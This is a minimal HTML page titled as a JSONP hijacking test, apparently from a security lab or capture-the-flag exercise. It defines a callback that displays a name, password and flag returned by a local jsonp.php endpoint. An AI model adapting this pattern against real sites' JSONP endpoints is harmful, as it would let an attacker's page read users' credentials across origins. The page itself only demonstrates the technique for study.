<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>JSONP劫持测试</title>
</head>
<body>
<script type="text/javascript">
function callbackFunction(result)
        {
        	alert(result.name);
            alert(result.pass);
            alert(result.flag);


        }
</script>
<script type="text/javascript" src="./jsonp.php?jsoncallback=callbackFunction"></script>
</body>
</html>